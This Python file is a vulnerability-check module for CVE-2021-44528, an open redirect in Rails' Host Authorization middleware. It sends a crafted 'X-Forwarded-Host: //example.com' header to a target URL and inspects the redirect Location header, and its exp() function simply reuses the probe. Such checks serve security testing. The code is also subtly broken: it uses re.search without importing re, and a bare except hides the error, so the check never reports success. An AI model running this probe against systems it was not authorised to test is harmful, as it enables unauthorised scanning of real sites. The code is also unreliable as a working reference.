import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Open Redirect in Host Authorization Middleware''',
        "description": '''Specially crafted "X-Forwarded-Host" headers in combination with certain "allowed host" formats can cause the Host Authorization middleware in Action Pack to redirect users to a malicious website.''',
        "severity": "medium",
        "references": [
            "https://seclists.org/oss-sec/2021/q4/att-160/7-0-host-authorzation-open-redirect.patch", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44528"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-44528",
            "cwe-id": "CWE-601"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "redirect"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {'X-Forwarded-Host': '//example.com'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$""",str(resp0.headers))) and (resp0.status_code == 301 or resp0.status_code == 302 or resp0.status_code == 307 or resp0.status_code == 308):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url